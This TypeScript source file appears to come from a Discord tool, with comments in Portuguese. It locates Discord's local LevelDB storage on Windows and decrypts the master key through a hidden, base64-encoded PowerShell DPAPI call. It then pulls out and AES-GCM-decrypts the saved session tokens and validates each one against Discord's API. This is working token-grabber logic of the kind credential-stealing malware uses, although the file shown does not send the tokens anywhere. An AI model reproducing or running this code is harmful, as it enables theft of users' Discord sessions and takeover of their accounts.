import fs from 'fs'
import path from 'path'
import crypto from 'crypto'
import { spawnSync } from 'child_process'
import { logger } from '../core/logger'

export interface DiscoveredToken {
  token: string
  source: string
  path: string
}

const DISCORD_PATHS = [
  { nome: 'Discord', pasta: 'discord' },
  { nome: 'DiscordCanary', pasta: 'discordcanary' },
  { nome: 'DiscordPTB', pasta: 'discordptb' },
]

/**
 * Descriptografa dados protegidos com DPAPI do Windows via PowerShell.
 * Usa DataProtectionScope.CurrentUser
 * @returns {Buffer | null} Dados descriptografados ou null em caso de falha
 */
function descriptografarDPAPI(buffer: Buffer): Buffer | null {
  const entrada = buffer.toString('base64')

  const scriptPS = `
    Add-Type -AssemblyName System.Security;
    $encrypted = [Convert]::FromBase64String("${entrada}");
    $decrypted = [System.Security.Cryptography.ProtectedData]::Unprotect(
      $encrypted, $null, [System.Security.Cryptography.DataProtectionScope]::CurrentUser
    );
    [System.Console]::OutputEncoding = [System.Text.Encoding]::UTF8;
    [System.Convert]::ToBase64String($decrypted);
  `

  const resultado = spawnSync(
    'powershell.exe',
    ['-EncodedCommand', Buffer.from(scriptPS, 'utf16le').toString('base64')],
    { encoding: 'utf8', windowsHide: true }
  )

  if (resultado.status !== 0 || resultado.error) {
    return null
  }

  try {
    return Buffer.from(resultado.stdout.trim(), 'base64')
  } catch {
    return null
  }
}

/**
 * Descriptografa token usando AES-256-GCM com a chave mestra do Discord
 * @returns {string | null} Token em texto plano ou null
 */
function descriptografarAES(buffer: Buffer, chave: Buffer): string | null {
  try {
    const iv = buffer.subarray(3, 15)
    const payload = buffer.subarray(15)

    const decipher = crypto.createDecipheriv('aes-256-gcm', chave, iv)
    decipher.setAuthTag(payload.subarray(-16))

    const descriptografado = Buffer.concat([
      decipher.update(payload.subarray(0, -16)),
      decipher.final(),
    ])

    return descriptografado.toString('utf8')
  } catch {
    return null
  }
}

/**
 * Varre os diretórios do Discord local para descobrir tokens salvos.
 * Processa LevelDB + DPAPI + AES-256-GCM (somente Windows)
 * @returns {Promise<DiscoveredToken[]>} Lista de tokens descobertos
 */
export async function scanForTokens(): Promise<DiscoveredToken[]> {
  if (process.platform !== 'win32') {
    logger.warn('TokenScanner', 'Scanner de tokens só funciona no Windows')
    return []
  }

  const appData = process.env.APPDATA
  if (!appData) {
    logger.error('TokenScanner', 'APPDATA não encontrado')
    return []
  }

  logger.info('TokenScanner', 'Iniciando varredura de tokens no sistema...')
  const discovered: DiscoveredToken[] = []
  const seenTokens = new Set<string>()

  for (const { nome, pasta } of DISCORD_PATHS) {
    const caminhoLvl = path.join(appData, pasta, 'Local Storage', 'leveldb')
    if (!fs.existsSync(caminhoLvl)) continue

    const caminhoLocalState = path.join(appData, pasta, 'Local State')
    if (!fs.existsSync(caminhoLocalState)) continue

    try {
      logger.info('TokenScanner', `Buscando em ${nome}...`)

      const localState = JSON.parse(fs.readFileSync(caminhoLocalState, 'utf-8'))
      const chaveEncriptada = Buffer.from(
        localState.os_crypt.encrypted_key,
        'base64'
      ).subarray(5)

      const chaveDescriptografada = descriptografarDPAPI(chaveEncriptada)
      if (!chaveDescriptografada) {
        logger.warn('TokenScanner', `Falha ao descriptografar chave DPAPI de ${nome}`)
        continue
      }

      const arquivos = fs.readdirSync(caminhoLvl)
        .filter((f) => f.endsWith('.ldb') || f.endsWith('.log'))

      for (const arquivo of arquivos) {
        const caminhoCompleto = path.join(caminhoLvl, arquivo)
        let conteudo: string
        try {
          conteudo = fs.readFileSync(caminhoCompleto, 'utf-8')
        } catch {
          continue
        }

        const linhas = conteudo.split('\n')

        for (const linha of linhas) {
          const match = linha.match(/dQw4w9WgXcQ:[^"]+/)
          if (!match) continue

          const dadosBase64 = match[0].split('dQw4w9WgXcQ:')[1]
          if (!dadosBase64) continue

          const tokenDescriptografado = descriptografarAES(
            Buffer.from(dadosBase64, 'base64'),
            chaveDescriptografada
          )

          if (tokenDescriptografado && !seenTokens.has(tokenDescriptografado)) {
            seenTokens.add(tokenDescriptografado)
            discovered.push({
              token: tokenDescriptografado,
              source: nome,
              path: caminhoLvl,
            })
          }
        }
      }
    } catch (erro) {
      logger.error('TokenScanner', `Erro ao processar ${nome}: ${erro}`)
      continue
    }
  }

  logger.info('TokenScanner', `Varredura concluída: ${discovered.length} token(s) encontrada(s)`)
  return discovered
}

export async function validateDiscoveredToken(token: string): Promise<{
  valid: boolean
  username?: string
  id?: string
  avatar?: string | null
  public_flags?: number
  premium_type?: number
}> {
  try {
    const res = await fetch('https://discord.com/api/v10/users/@me', {
      headers: { Authorization: token },
    })
    if (!res.ok) return { valid: false }

    const user = await res.json() as { id: string; username: string; avatar: string | null; public_flags?: number; premium_type?: number }
    return {
      valid: true,
      id: user.id,
      username: user.username,
      avatar: user.avatar,
      public_flags: user.public_flags,
      premium_type: user.premium_type,
    }
  } catch {
    return { valid: false }
  }
}
